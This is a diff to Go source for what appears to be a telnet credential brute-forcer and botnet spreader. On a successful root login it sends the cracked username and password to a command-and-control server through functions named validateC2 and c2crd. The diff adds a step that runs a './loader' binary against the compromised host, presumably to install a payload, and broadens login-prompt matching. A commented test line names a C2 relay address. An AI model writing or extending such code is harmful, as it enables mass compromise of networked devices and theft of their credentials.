@@ -6,6 +6,7 @@ import (
 	"strings"
 	"time"
 	"os"
+	"os/exec"
 	"golang.org/x/crypto/ssh"
 )
 
@@ -116,14 +117,19 @@ func isTelnetOpen(ip string,port string) {
 					}
 					if strings.Contains(s,"#"){
 						fmt.Println("Sucessful")
-						if validateC2(ip,"23"){
-							c2crd(user,password,ip,"23")
+						if validateC2(ip,port){
+							c2crd(user,password,ip,port)
 						}else{
 							writetolocal(user+":"+password)
 						}
+						go func(){
+							fmt.Println("execute this file")
+							cmd:=exec.Command("./loader "+user+" "+password+" "+ip+" "+port)
+							cmd.Run()
+						}()
 						return 
 					}
-					if strings.Contains(s,"login")||strings.Contains(s,"Password"){
+					if strings.Contains(s,"login")||strings.Contains(s,"Login")||strings.Contains(s,"password")||strings.Contains(s,"Password"){
 						break
 					}
 					
@@ -303,5 +309,5 @@ func main() {
 	//if validateC2("192.168.1.97","31337"){
 	//	c2crd("test","test","192.168.1.97","31337")
 	//} //test connect relay
-	
+	time.Sleep(20*time.Second)
 }
